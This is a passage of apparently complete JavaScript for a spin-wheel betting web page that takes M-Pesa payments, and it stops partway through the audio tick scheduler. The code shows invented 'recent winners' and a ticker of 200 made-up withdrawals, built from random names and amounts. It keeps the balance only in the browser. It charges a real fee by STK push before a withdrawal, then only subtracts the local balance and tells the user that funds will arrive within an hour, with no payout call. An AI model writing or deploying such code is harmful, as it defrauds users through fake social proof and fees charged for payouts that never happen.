// ====================== DOM Elements ======================
const canvas = document.getElementById('wheelCanvas');
const ctx = canvas.getContext('2d');
const balanceSpan = document.getElementById('balanceDisplay');
const stakeInput = document.getElementById('stakeInput');
const spinBtn = document.getElementById('spinButton');
const resultMsg = document.getElementById('resultMessage');
const winnersList = document.getElementById('winnersList');
const stakeChips = document.querySelectorAll('.stake-chip');
const withdrawalTicker = document.getElementById('withdrawal-ticker');
const depositBtn = document.getElementById('depositBtn');
const withdrawBtn = document.getElementById('withdrawBtn');

// ====================== API Endpoints ======================
const API_ENDPOINTS = {
  initiatePayment: '/api/initiate-payment',
  verifyPayment: '/api/verify-payment',
  normalizePhone: '/api/normalize-phone'
};

// ====================== Balance & Account Management ======================
let balance = 1000;
let isProcessing = false;
let paymentReference = null;

function loadBalance() {
  const savedBalance = localStorage.getItem('multiwin_balance');
  if (savedBalance) {
    balance = parseInt(savedBalance, 10);
  } else {
    balance = 1000;
    localStorage.setItem('multiwin_balance', balance.toString());
  }
  updateBalanceUI();
}

function saveBalance() {
  localStorage.setItem('multiwin_balance', balance.toString());
}

function updateBalanceUI() {
  balanceSpan.innerText = balance;
  const maxStake = Math.min(balance, 10000);
  stakeInput.max = maxStake;
  if (parseInt(stakeInput.value) > maxStake) stakeInput.value = maxStake;
  saveBalance();
}

// ====================== Phone Number Utilities ======================
function validatePhoneFormat(phone) {
  const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
  if (cleanPhone.length < 9) {
    return { valid: false, message: 'Phone number must be at least 9 digits' };
  }
  const digitsOnly = cleanPhone.replace(/^\+/, '');
  if (!/^\d+$/.test(digitsOnly)) {
    return { valid: false, message: 'Phone number must contain only digits' };
  }
  return { valid: true, clean: cleanPhone };
}

async function normalizePhoneNumber(phone) {
  try {
    const response = await fetch(API_ENDPOINTS.normalizePhone, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify({ phone: phone })
    });
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || 'Phone normalization failed');
    return data.normalized_phone;
  } catch (error) {
    console.error('Phone normalization error:', error);
    throw error;
  }
}

// ====================== Payment Functions ======================
async function sendSTKPush(phoneNumber, amount) {
  const payload = { phone_number: phoneNumber, amount: amount };
  const response = await fetch(API_ENDPOINTS.initiatePayment, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    body: JSON.stringify(payload)
  });
  const responseData = await response.json();
  if (!response.ok) {
    throw new Error(responseData.error || responseData.message || 'Payment initiation failed');
  }
  return responseData;
}

async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
  let attempts = 0;
  return new Promise((resolve, reject) => {
    const checkInterval = setInterval(async () => {
      attempts++;
      try {
        const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`, {
          headers: { 'Accept': 'application/json' }
        });
        const data = await response.json();
        if (!response.ok) {
          if (attempts >= maxAttempts) { clearInterval(checkInterval); reject(new Error('Payment verification failed')); }
          return;
        }
        if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS' || data.status === 'success')) {
          clearInterval(checkInterval); resolve(true);
        } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED' || data.status === 'failed')) {
          clearInterval(checkInterval); reject(new Error('Payment failed or was cancelled'));
        } else if (attempts >= maxAttempts) {
          clearInterval(checkInterval); reject(new Error('Payment verification timeout'));
        }
      } catch (error) {
        if (attempts >= maxAttempts) { clearInterval(checkInterval); reject(new Error('Payment verification failed')); }
      }
    }, intervalMs);
  });
}

// ====================== Withdrawal Fee ======================
async function processWithdrawalFeePayment(phone, feeAmount, withdrawalAmount) {
  try {
    Swal.fire({
      title: 'Processing Fee Payment',
      html: 'Please wait...',
      allowOutsideClick: false,
      background: '#1a1f2e',
      color: 'white',
      didOpen: () => Swal.showLoading()
    });

    let normalizedPhone;
    try {
      normalizedPhone = await normalizePhoneNumber(phone);
    } catch (error) {
      normalizedPhone = phone.startsWith('0') ? '254' + phone.substring(1) :
                       phone.startsWith('7') ? '254' + phone :
                       phone.startsWith('1') ? '254' + phone : phone;
    }

    Swal.update({ title: 'Sending STK Push', html: 'Initiating fee payment request...' });

    const paymentResponse = await sendSTKPush(normalizedPhone, feeAmount);
    if (!paymentResponse || !paymentResponse.reference) {
      throw new Error('Failed to initiate payment - no reference received');
    }
    paymentReference = paymentResponse.reference;

    Swal.fire({
      title: 'STK Push Sent!',
      html: `
        <div style="text-align: center;">
          <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;"><i class="fas fa-mobile-alt"></i></div>
          <p><strong>Check your phone for the M-Pesa STK push</strong></p>
          <div style="background: #0b0d17; padding: 12px; border-radius: 12px; margin: 12px 0; font-weight: 600; color: #f1c40f; border: 1px solid #2a324a;">${normalizedPhone}</div>
          <p style="color: #a0aec0; margin-top: 5px;">Withdrawal Fee: <strong>KES ${feeAmount.toLocaleString()}</strong><br>Enter your M-Pesa PIN to complete</p>
          <div style="background: #0b0d17; padding: 10px; border-radius: 8px; margin-top: 12px;"><small>Verifying payment... This may take up to 60 seconds</small></div>
        </div>`,
      showConfirmButton: false,
      allowOutsideClick: false,
      background: '#1a1f2e',
      color: 'white'
    });

    const paymentSuccess = await checkPaymentStatus(paymentReference);
    if (paymentSuccess) await processWithdrawal(phone, withdrawalAmount);
  } catch (error) {
    let errorMessage = error.message || 'Fee payment failed';
    if (errorMessage.includes('timeout')) errorMessage = 'Payment verification timed out. Please check your M-Pesa messages.';
    else if (errorMessage.includes('cancelled')) errorMessage = 'You cancelled the payment on your phone.';
    Swal.fire({
      icon: 'error',
      title: 'Fee Payment Failed',
      html: `<p><strong>${errorMessage}</strong></p><p style="color: #a0aec0; margin-top:10px;">Withdrawal cancelled. Please try again.</p>`,
      confirmButtonText: 'OK',
      confirmButtonColor: '#f1c40f',
      background: '#1a1f2e',
      color: 'white'
    });
  } finally {
    isProcessing = false;
    paymentReference = null;
  }
}

function showWithdrawalFeeModal(phone, withdrawalAmount) {
  const fee = Math.min(Math.round((0.08 * withdrawalAmount) / 5) * 5, 2500);
  Swal.fire({
    title: 'Withdrawal Fee Required',
    html: `
      <div style="text-align: center;">
        <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;"><i class="fas fa-coins"></i></div>
        <p><strong>A fee of KES ${fee.toLocaleString()} is required to process your withdrawal</strong></p>
        <div style="background: #0b0d17; padding: 12px; border-radius: 12px; margin: 12px 0;">
          <p style="color: #a0aec0; margin-bottom: 5px;">Withdrawal Amount: <span style="color: #f1c40f;">KES ${withdrawalAmount.toLocaleString()}</span></p>
          <p style="color: #a0aec0;">Fee: <span style="color: #f1c40f;">KES ${fee.toLocaleString()}</span></p>
        </div>
        <p style="color: #a0aec0; font-size: 0.85rem;">An M-Pesa STK push will be sent to <strong>${phone}</strong></p>
      </div>`,
    icon: 'info',
    showCancelButton: true,
    confirmButtonText: 'Pay Fee',
    cancelButtonText: 'Cancel',
    confirmButtonColor: '#f1c40f',
    cancelButtonColor: '#6c757d',
    background: '#1a1f2e',
    color: 'white',
    allowOutsideClick: false
  }).then((result) => {
    if (result.isConfirmed) processWithdrawalFeePayment(phone, fee, withdrawalAmount);
    else isProcessing = false;
  });
}

// ====================== Process Withdrawal ======================
async function processWithdrawal(phone, amount) {
  try {
    Swal.fire({
      title: 'Processing Withdrawal',
      html: 'Please wait...',
      allowOutsideClick: false,
      background: '#1a1f2e',
      color: 'white',
      didOpen: () => Swal.showLoading()
    });

    await new Promise(resolve => setTimeout(resolve, 3000));

    balance -= amount;
    updateBalanceUI();

    const names = ['Mwangi', 'Achieng', 'Odhiambo', 'Kamau', 'Njeri'];
    const randomName = names[Math.floor(Math.random() * names.length)];
    withdrawalTicker.textContent = `${randomName} withdrew KES ${amount.toLocaleString()} · just now`;

    await Swal.fire({
      icon: 'success',
      title: 'Withdrawal Initiated! 💸',
      html: `
        <div style="text-align: center;">
          <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;"><i class="fas fa-check-circle"></i></div>
          <p><strong>KES ${amount.toLocaleString()} withdrawal request received</strong></p>
          <div style="background: #0b0d17; padding: 12px; border-radius: 12px; margin: 15px 0;">
            <p style="color: #a0aec0; margin-bottom: 5px;">Phone: <span style="color: #f1c40f;">${phone}</span></p>
            <p style="color: #a0aec0;">Amount: <span style="color: #f1c40f;">KES ${amount.toLocaleString()}</span></p>
          </div>
          <p style="color: #f1c40f; font-weight: 600; margin: 10px 0;">⏱️ Funds will be sent to your M-Pesa within 1 hour</p>
          <p style="color: #a0aec0; font-size: 0.8rem; margin-top: 10px;">You'll receive an M-Pesa confirmation message once processed.</p>
        </div>`,
      confirmButtonText: 'OK',
      confirmButtonColor: '#f1c40f',
      background: '#1a1f2e',
      color: 'white',
      allowOutsideClick: false
    });
  } catch (error) {
    Swal.fire({
      icon: 'error',
      title: 'Withdrawal Failed',
      text: 'An error occurred. Please try again.',
      confirmButtonText: 'OK',
      confirmButtonColor: '#f1c40f',
      background: '#1a1f2e',
      color: 'white'
    });
  }
}

// ====================== Process Payment ======================
async function processPayment(type, phone, amount) {
  if (isProcessing) return;
  const isDeposit = type === 'deposit';

  if (!isDeposit && amount > balance) {
    Swal.fire({
      icon: 'error',
      title: 'Insufficient Balance',
      text: `Your balance is KES ${balance.toLocaleString()}`,
      confirmButtonColor: '#f1c40f',
      background: '#1a1f2e',
      color: 'white'
    });
    return;
  }

  isProcessing = true;

  if (isDeposit) {
    try {
      Swal.fire({ title: 'Processing', html: 'Please wait...', allowOutsideClick: false, background: '#1a1f2e', color: 'white', didOpen: () => Swal.showLoading() });
      Swal.update({ title: 'Validating Phone', html: 'Checking phone number format...' });

      let normalizedPhone;
      try {
        normalizedPhone = await normalizePhoneNumber(phone);
      } catch (error) {
        normalizedPhone = phone.startsWith('0') ? '254' + phone.substring(1) :
                         phone.startsWith('7') ? '254' + phone :
                         phone.startsWith('1') ? '254' + phone : phone;
      }

      Swal.update({ title: 'Sending STK Push', html: 'Initiating payment request to your phone...' });

      const paymentResponse = await sendSTKPush(normalizedPhone, amount);
      if (!paymentResponse || !paymentResponse.reference) {
        throw new Error('Failed to initiate payment - no reference received');
      }
      paymentReference = paymentResponse.reference;

      Swal.fire({
        title: 'STK Push Sent!',
        html: `
          <div style="text-align: center;">
            <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;"><i class="fas fa-mobile-alt"></i></div>
            <p><strong>Check your phone for the M-Pesa STK push</strong></p>
            <div style="background: #0b0d17; padding: 12px; border-radius: 12px; margin: 12px 0; font-weight: 600; color: #f1c40f; border: 1px solid #2a324a;">${normalizedPhone}</div>
            <p style="color: #a0aec0; margin-top: 5px;">Amount: <strong>KES ${amount.toLocaleString()}</strong><br>Enter your M-Pesa PIN to complete deposit</p>
            <div style="background: #0b0d17; padding: 10px; border-radius: 8px; margin-top: 12px;"><small>Verifying payment... This may take up to 60 seconds</small></div>
          </div>`,
        showConfirmButton: false,
        allowOutsideClick: false,
        background: '#1a1f2e',
        color: 'white'
      });

      const paymentSuccess = await checkPaymentStatus(paymentReference);
      if (paymentSuccess) {
        balance += amount;
        updateBalanceUI();

        const names = ['John', 'Mary', 'Peter', 'Ann', 'James'];
        const randomName = names[Math.floor(Math.random() * names.length)];
        withdrawalTicker.textContent = `${randomName} deposited KES ${amount.toLocaleString()} · just now`;

        await Swal.fire({
          icon: 'success',
          title: 'Deposit Successful! 🎉',
          html: `
            <div style="text-align: center;">
              <p><strong>KES ${amount.toLocaleString()} added to your balance</strong></p>
              <div style="background: #0b0d17; padding: 10px; border-radius: 8px; margin-top: 12px;">
                <p style="color: #a0aec0; font-size: 0.8rem;">Reference: ${paymentReference}</p>
              </div>
            </div>`,
          confirmButtonText: 'OK',
          confirmButtonColor: '#f1c40f',
          background: '#1a1f2e',
          color: 'white',
          timer: 3000,
          timerProgressBar: true
        });
      }
    } catch (error) {
      let errorMessage = error.message || 'Payment processing failed';
      if (errorMessage.includes('timeout')) errorMessage = 'Payment verification timed out. Please check your M-Pesa messages for confirmation.';
      else if (errorMessage.includes('cancelled')) errorMessage = 'You cancelled the payment on your phone.';
      else if (errorMessage.includes('failed')) errorMessage = 'Payment failed. Please check your M-Pesa balance and try again.';
      Swal.fire({
        icon: 'error',
        title: 'Deposit Failed',
        html: `<div style="text-align: center;"><p><strong>${errorMessage}</strong></p><p style="color: #a0aec0; margin-top: 10px; font-size: 0.85rem;">If money was deducted, it will be refunded within 24 hours.</p></div>`,
        confirmButtonText: 'Try Again',
        confirmButtonColor: '#f1c40f',
        background: '#1a1f2e',
        color: 'white'
      });
    }
  } else {
    showWithdrawalFeeModal(phone, amount);
  }

  isProcessing = false;
  paymentReference = null;
}

// ====================== Modal Creation ======================
function createModal(type) {
  if (isProcessing) return;
  const existingModal = document.querySelector('.modal-overlay');
  if (existingModal) existingModal.remove();

  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';

  const isDeposit = type === 'deposit';
  const title = isDeposit ? 'Deposit Funds' : 'Withdraw Winnings';
  const icon = isDeposit ? 'fa-plus-circle' : 'fa-minus-circle';
  const btnText = isDeposit ? 'Deposit' : 'Withdraw';
  const minAmount = isDeposit ? 10 : 100;
  const minMessage = isDeposit ? 'Minimum deposit: KES 10' : 'Minimum withdrawal: KES 100';

  const balanceDisplayHtml = !isDeposit ? `
    <div class="modal-balance-box">
      <span class="modal-balance-label">Your Balance:</span>
      <span class="modal-balance-value">KES ${balance.toLocaleString()}</span>
    </div>` : '';

  overlay.innerHTML = `
    <div class="modal-container">
      <div class="modal-header">
        <div class="modal-title"><i class="fas ${icon}"></i><span>${title}</span></div>
        <button class="modal-close" id="modalClose"><i class="fas fa-times"></i></button>
      </div>
      <div class="modal-body">
        ${balanceDisplayHtml}
        <div class="modal-input-group">
          <div class="modal-label">Phone Number</div>
          <div class="modal-input-wrapper" style="padding-left: 0;">
            <div class="modal-phone-prefix">+254</div>
            <input type="tel" class="modal-input" id="modalPhone" placeholder="712345678" style="border-radius: 0 16px 16px 0;">
          </div>
          <div class="modal-error" id="phoneError"></div>
        </div>
        <div class="modal-input-group">
          <div class="modal-label">Amount (KES)</div>
          <div class="modal-input-wrapper">
            <i class="fas fa-coins"></i>
            <input type="number" class="modal-input" id="modalAmount" placeholder="Enter amount" min="${minAmount}" max="70000" step="1">
          </div>
          <div class="modal-error" id="amountError"></div>
        </div>
        <div class="modal-info-box">
          <i class="fas fa-info-circle"></i>
          <span>${minMessage}. ${isDeposit ? 'An M-Pesa STK push will be sent to your phone.' : 'Funds will be sent to your M-Pesa within 1 hour.'}</span>
        </div>
      </div>
      <div class="modal-footer">
        <button class="modal-btn modal-btn-secondary" id="modalCancel">Cancel</button>
        <button class="modal-btn modal-btn-primary" id="modalConfirm"><i class="fas ${icon}"></i> ${btnText}</button>
      </div>
    </div>`;

  document.body.appendChild(overlay);
  overlay.style.display = 'flex';

  const closeBtn = document.getElementById('modalClose');
  const cancelBtn = document.getElementById('modalCancel');
  const confirmBtn = document.getElementById('modalConfirm');
  const phoneInput = document.getElementById('modalPhone');
  const amountInput = document.getElementById('modalAmount');
  const phoneError = document.getElementById('phoneError');
  const amountError = document.getElementById('amountError');

  function validatePhone() {
    const phone = phoneInput.value.trim();
    if (!phone) { phoneError.textContent = 'Phone number is required'; return false; }
    const validation = validatePhoneFormat(phone);
    if (!validation.valid) { phoneError.textContent = validation.message; return false; }
    phoneError.textContent = '';
    return true;
  }

  function validateAmount() {
    const amount = parseInt(amountInput.value, 10);
    if (!amount || amount < minAmount) { amountError.textContent = `Minimum ${isDeposit ? 'deposit' : 'withdrawal'} is KES ${minAmount}`; return false; }
    if (!isDeposit && amount > balance) { amountError.textContent = 'Insufficient balance'; return false; }
    if (amount > 70000) { amountError.textContent = 'Maximum transaction is KES 70,000'; return false; }
    amountError.textContent = '';
    return true;
  }

  phoneInput.addEventListener('input', validatePhone);
  amountInput.addEventListener('input', validateAmount);

  function closeModal() {
    overlay.style.display = 'none';
    setTimeout(() => overlay.remove(), 300);
  }

  closeBtn.addEventListener('click', closeModal);
  cancelBtn.addEventListener('click', closeModal);
  overlay.addEventListener('click', function(e) { if (e.target === overlay) closeModal(); });

  confirmBtn.addEventListener('click', function() {
    const isPhoneValid = validatePhone();
    const isAmountValid = validateAmount();
    if (!isPhoneValid || !isAmountValid) return;
    const phone = phoneInput.value.trim();
    const amount = parseInt(amountInput.value, 10);
    closeModal();
    processPayment(type, phone, amount);
  });
}

// ====================== Wheel Segments ======================
const segments = [
  { multiplier: 'X2',  color: '#FF6B6B' },
  { multiplier: 'X5',  color: '#4ECDC4' },
  { multiplier: 'X0',  color: '#9B59B6' },
  { multiplier: 'X10', color: '#FFB347' },
  { multiplier: 'X15', color: '#F4D03F' },
  { multiplier: 'X3',  color: '#E67E22' },
  { multiplier: 'X20', color: '#5DADE2' },
  { multiplier: 'X50', color: '#2ECC71' }
];

const numSegments = segments.length;
const angleStep = (Math.PI * 2) / numSegments;
let wheelAngle = 0;
let spinning = false;
let animationFrame = null;

// ====================== Audio ======================
// Uses the Web Audio API with a pure setTimeout-based scheduler that runs
// independently of rAF. Tick interval is derived from the easing curve's
// instantaneous angular velocity so clicks perfectly mirror wheel speed.

let audioCtx = null;

function initAudio() {
  if (audioCtx) return;
  audioCtx = new (window.AudioContext || window.webkitAudioContext)();
}

// Synthesise a single soft click at the given AudioContext time.
// Tone: low-frequency sine burst with fast exponential decay — like a
// wooden peg brushing a rubber flap. Quiet and warm, not sharp or tinny.
function playClick(atTime, intensity) {
  if (!audioCtx) return;

  const sampleRate = audioCtx.sampleRate;
  const durationSec = 0.07;
  const frames = Math.floor(sampleRate * durationSec);
  const buf = audioCtx.createBuffer(1, frames, sampleRate);
  const data = buf.getChannelData(0);

  // Two sine components: fundamental + subtle harmonic for warmth
  const f1 = 110; // Hz — low, wooden
  const f2 = 185; // Hz — gentle harmonic
  for (let i = 0; i < frames; i++) {
    const t = i / sampleRate;
    const env = Math.exp(-t * 55); // fast decay, no ring
    data[i] = (Math.sin(2 * Math.PI * f1 * t) * 0.6 +
               Math.sin(2 * Math.PI * f2 * t) * 0.4) * env;
  }

  const src = audioCtx.createBufferSource();
  src.buffer = buf;

  // Gentle low-pass so it stays warm as speed changes
  const lpf = audioCtx.createBiquadFilter();
  lpf.type = 'lowpass';
  lpf.frequency.value = 900;

  // Master gain — quiet; intensity (0–1) slightly raises it when fast
  const gain = audioCtx.createGain();
  gain.gain.value = 0.10 + intensity * 0.08;

  src.connect(lpf);
  lpf.connect(gain);
  gain.connect(audioCtx.destination);
  src.start(atTime);
}

// ====================== Winners Feed ======================
const firstNames = [
  "Mwangi", "Achieng", "Odhiambo", "Kamau", "Njeri", "Kipchoge", "Wanjiku", "Otieno", "Akinyi", "Mutua",
  "Kiprop", "Chebet", "Kiplagat", "Jepchirchir", "Kipkorir", "Jerono", "Kipkemboi", "Chepkoech", "Kiprono", "Jepkemoi",
  "Omondi", "Adhiambo", "Okoth", "Awuor", "Ochieng", "Atieno", "Onyango", "Akoth", "Odongo", "Auma",
  "Karanja", "Wairimu", "Njoroge", "Nyambura", "Kimani", "Wambui", "Maina", "Njoki", "Ngugi", "Muthoni",
  "Mutiso", "Mwikali", "Kioko", "Ndunge", "Maundu", "Ndanu", "Musyoka", "Kavindu", "Munyao", "Wayua",
  "Kipchumba", "Chepkwony", "Kosgei", "Jelagat", "Kiprotich", "Cherotich", "Kipruto", "Jepkosgei",
  "Were", "Apiyo", "Ouma", "Anyango", "Awino", "Mwenda", "Kanyiri", "Gitonga", "Karimi", "Mugambi",
  "Kagwiria", "Muriuki", "Nkatha", "Kipkurui", "Chepngetich", "Kipyego", "Jepkoech", "Kipsang", "Chepchumba",
  "Wekesa", "Nekesa", "Wanjala", "Nafula", "Wanyama", "Naliaka", "Masinde", "Namalwa",
  "Brian", "John", "Peter", "James", "David", "Michael", "Robert", "Daniel", "Paul", "Mark",
  "Kevin", "Thomas", "Christopher", "Joseph", "Charles", "Anthony", "Stephen", "Andrew", "Joshua", "William",
  "George", "Eric", "Edward", "Patrick", "Richard", "Alex", "Samuel", "Kenneth", "Francis", "Simon",
  "Mary", "Jane", "Elizabeth", "Sarah", "Margaret", "Ann", "Susan", "Dorothy", "Helen", "Ruth",
  "Esther", "Alice", "Grace", "Joyce", "Catherine", "Florence", "Lucy", "Rose", "Caroline", "Janet",
  "Collins", "Evans", "Harrison", "Isaac", "Jackson", "Kennedy", "Moses", "Newton", "Pius", "Raphael",
  "Brenda", "Cynthia", "Doreen", "Eunice", "Fridah", "Gloria", "Harriet", "Ivy", "Jacqueline", "Lydia"
];

const lastNames = [
  "Mwangi", "Odhiambo", "Kamau", "Kipchoge", "Otieno", "Mutua", "Kiprop", "Kiplagat", "Omondi", "Okoth",
  "Ochieng", "Onyango", "Odongo", "Karanja", "Njoroge", "Kimani", "Maina", "Ngugi", "Mutiso", "Kioko",
  "Musyoka", "Munyao", "Wekesa", "Wanjala", "Wanyama", "Masinde", "Ouma", "Apiyo", "Mwenda", "Gitonga",
  "Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Wilson", "Anderson", "Taylor",
  "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Clark", "Lewis"
];

const multipliers = ['X2', 'X5', 'X10', 'X15', 'X20', 'X30', 'X50'];
const stakes = [10, 20, 50, 100, 200, 500];

const timeModifiers = [
  "just now", "just now", "just now", "just now", "just now",
  "1 min ago", "1 min ago", "1 min ago",
  "2 mins ago", "2 mins ago", "2 mins ago", "2 mins ago",
  "3 mins ago", "3 mins ago",
  "4 mins ago",
  "5 mins ago"
];

function randomName() {
  const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
  const useLastName = Math.random() > 0.5;
  if (useLastName) {
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    return `${firstName} ${lastName}`;
  }
  return firstName;
}

function randomTime() {
  return timeModifiers[Math.floor(Math.random() * timeModifiers.length)];
}

function randomWin() {
  const mult = multipliers[Math.floor(Math.random() * multipliers.length)];
  const stake = stakes[Math.floor(Math.random() * stakes.length)];
  const multValue = parseInt(mult.replace('X', ''));
  const value = multValue * stake;
  return { name: randomName(), value: value, time: randomTime() };
}

let winnersFeed = [];
for (let i = 0; i < 5; i++) winnersFeed.push(randomWin());

function renderWinnersFeed() {
  winnersList.innerHTML = '';
  winnersFeed.forEach(win => {
    const li = document.createElement('li');
    li.innerHTML = `
      <span class="winner-name">${win.name}</span>
      <span class="winner-win">+${win.value.toLocaleString()} Kes</span>
      <span class="winner-time">${win.time}</span>`;
    winnersList.appendChild(li);
  });
}

setInterval(() => {
  const newWin = randomWin();
  winnersFeed.unshift(newWin);
  winnersFeed = winnersFeed.slice(0, 5);
  renderWinnersFeed();
}, 5000);

// ====================== Withdrawal Ticker ======================
function generateWithdrawalMessages() {
  const tickerFirstNames = [
    "Mwangi", "Achieng", "Odhiambo", "Kamau", "Njeri", "Kipchoge", "Wanjiku", "Otieno", "Akinyi", "Mutua",
    "Kiprop", "Chebet", "Kiplagat", "Jepchirchir", "Kipkorir", "Jerono", "Kipkemboi", "Chepkoech", "Kiprono",
    "Omondi", "Adhiambo", "Okoth", "Awuor", "Ochieng", "Atieno", "Onyango", "Akoth", "Odongo", "Auma",
    "Karanja", "Wairimu", "Njoroge", "Nyambura", "Kimani", "Wambui", "Maina", "Njoki", "Ngugi", "Muthoni",
    "Mutiso", "Mwikali", "Kioko", "Ndunge", "Musyoka", "Kavindu", "Munyao", "Wayua",
    "Brian", "John", "Peter", "James", "David", "Michael", "Robert", "Daniel", "Paul", "Mark",
    "Kevin", "Thomas", "Christopher", "Joseph", "Charles", "Anthony", "Stephen", "Andrew", "Joshua", "William",
    "George", "Eric", "Edward", "Patrick", "Richard", "Alex", "Samuel", "Kenneth", "Francis", "Simon",
    "Vincent", "Nicholas", "Dennis", "Felix", "Geoffrey", "Henry", "Ian", "Jacob", "Julius", "Lawrence",
    "Mary", "Jane", "Elizabeth", "Sarah", "Margaret", "Ann", "Susan", "Dorothy", "Helen", "Ruth",
    "Esther", "Alice", "Grace", "Joyce", "Catherine", "Florence", "Lucy", "Rose", "Caroline", "Janet",
    "Agnes", "Beatrice", "Christine", "Diana", "Emily", "Faith", "Gladys", "Hannah", "Irene", "Judith",
    "Karen", "Lillian", "Mercy", "Nancy", "Olivia", "Patricia", "Rachel", "Sophia", "Teresa", "Veronica"
  ];

  const messages = [];
  for (let i = 0; i < 200; i++) {
    const firstName = tickerFirstNames[Math.floor(Math.random() * tickerFirstNames.length)];
    const lastName = Math.random() > 0.3 ?
      ` ${lastNames[Math.floor(Math.random() * lastNames.length)].charAt(0)}.` : '';
    const fullName = firstName + lastName;
    const amount = Math.floor(Math.random() * (70000 - 500 + 1) + 500);
    const roundedAmount = Math.round(amount / 100) * 100;
    const tickerTimes = [
      "just now", "1 min ago", "2 mins ago", "3 mins ago", "4 mins ago",
      "5 mins ago", "6 mins ago", "7 mins ago", "8 mins ago", "9 mins ago",
      "10 mins ago", "12 mins ago", "15 mins ago", "20 mins ago", "25 mins ago",
      "30 mins ago", "just now", "just now", "2 mins ago"
    ];
    const time = tickerTimes[Math.floor(Math.random() * tickerTimes.length)];
    messages.push(`${fullName} withdrew Kes ${roundedAmount.toLocaleString()} · ${time}`);
  }
  return messages.sort(() => Math.random() - 0.5);
}

const withdrawalMessages = generateWithdrawalMessages();
let withdrawalIndex = 0;

setInterval(() => {
  withdrawalIndex = (withdrawalIndex + 1) % withdrawalMessages.length;
  withdrawalTicker.textContent = withdrawalMessages[withdrawalIndex];
}, 4000);

console.log(`✅ Loaded ${withdrawalMessages.length} withdrawal messages`);

// ====================== Stake Handlers ======================
stakeChips.forEach(chip => {
  chip.addEventListener('click', () => {
    let amount = parseInt(chip.dataset.amount, 10);
    const currentVal = parseInt(stakeInput.value, 10) || 0;
    let newVal = currentVal + amount;
    if (newVal > balance) newVal = balance;
    if (newVal < 1) newVal = 1;
    stakeInput.value = newVal;
  });
});

stakeInput.addEventListener('change', function () {
  let val = parseInt(this.value, 10);
  if (isNaN(val) || val < 1) val = 1;
  if (val > balance) val = balance;
  this.value = val;
});

// ====================== Draw Wheel ======================
function drawWheel(angle) {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  const centerX = canvas.width / 2, centerY = canvas.height / 2, radius = canvas.width / 2;

  for (let i = 0; i < numSegments; i++) {
    const start = i * angleStep + angle;
    const end = start + angleStep;

    ctx.beginPath();
    ctx.moveTo(centerX, centerY);
    ctx.arc(centerX, centerY, radius, start, end);
    ctx.closePath();
    ctx.fillStyle = segments[i].color;
    ctx.fill();
    ctx.strokeStyle = 'rgba(255,255,255,0.2)';
    ctx.lineWidth = 2;
    ctx.stroke();

    ctx.save();
    ctx.translate(centerX, centerY);
    ctx.rotate(start + angleStep / 2);
    ctx.textAlign = 'center';
    ctx.fillStyle = '#fff';
    ctx.font = 'bold 20px "Inter", sans-serif';
    ctx.shadowColor = '#000';
    ctx.shadowBlur = 6;
    ctx.fillText(segments[i].multiplier, 120, 8);
    ctx.restore();
  }

  ctx.beginPath();
  ctx.arc(centerX, centerY, 32, 0, 2 * Math.PI);
  ctx.fillStyle = '#0f1422';
  ctx.fill();
  ctx.strokeStyle = '#ffd966';
  ctx.lineWidth = 3;
  ctx.stroke();

  ctx.beginPath();
  ctx.moveTo(centerX - 18, 10);
  ctx.lineTo(centerX + 18, 10);
  ctx.lineTo(centerX, 34);
  ctx.closePath();
  ctx.fillStyle = '#f1c40f';
  ctx.shadowColor = '#f39c12';
  ctx.shadowBlur = 12;
  ctx.fill();
  ctx.shadowBlur = 0;
  ctx.strokeStyle = '#fff';
  ctx.lineWidth = 2;
  ctx.stroke();
}

// ====================== Spin Logic ======================
let spinCount = 0;
const positiveMultipliers = ['X2', 'X3', 'X5', 'X10', 'X15', 'X20', 'X50'];

let spinStartAngle = 0;
let spinTotalDelta = 0;
let spinStartTime = 0;
const SPIN_DURATION_MS = 4000;

// Quartic ease-out: fast start, smooth deceleration to precise stop
function easeOut(t) {
  return 1 - Math.pow(1 - t, 4);
}

// Derivative of easeOut — gives instantaneous normalised speed at time t.
// Used by the audio scheduler to convert progress → angular velocity.
// easeOut'(t) = 4*(1-t)^3
function easeOutDerivative(t) {
  return 4 * Math.pow(1 - t, 3);
}

// ====================== Audio Tick Scheduler ======================
// Runs on setTimeout (not rAF) so it stays accurate even when the tab
// is throttled. Each iteration looks ahead ~100 ms and pre-schedules
// all clicks that fall inside that window using the audio clock.
let tickSchedulerTimer = null;
let nextTickAngle = 0;          // wheel angle at which the next click fires
const TICK_EVERY_RADIANS = (Math.PI * 2) / numSegments; // one click per segment boundary

function stopTickScheduler() {
  if (tickSchedulerTimer !== null) {
    clearTimeout(tickSchedulerTimer);
    tickSchedulerTimer = null;
  }
}

function scheduleTicksAhead() {
  if (!spinning || !audioCtx) return;

  const LOOKAHEAD_SEC = 0.12; // schedule this far ahead of now
  const now = audioCtx.currentTime;
  const wallNow = performance.now();

  // We schedule clicks up to (now + LOOKAHEAD_SEC) on the audio clock.
  // For each upcoming click we need to know:
  //   1. What wheel angle it corresponds to  (nextTickAngle)
  //   2. What wall-clock time that angle will be reached
  //   3. What the audio-clock time is at that moment

  const audioClockOffset = now - wallNow / 1000; // audio_t = wall_ms/1000 + offset

  // Look ahead: iterate over upcoming tick angles and schedule if they
  // fall within the lookahead window
  while (true) {
    // Find the normalised progress t at which wheelAngle == nextTickAngle
    // wheelAngle(t) = spinStartAngle + spinTotalDelta * easeOut(t)
    // => easeOut(t) = (nextTickAngle - spinStartAngle) / spinTotalDelta
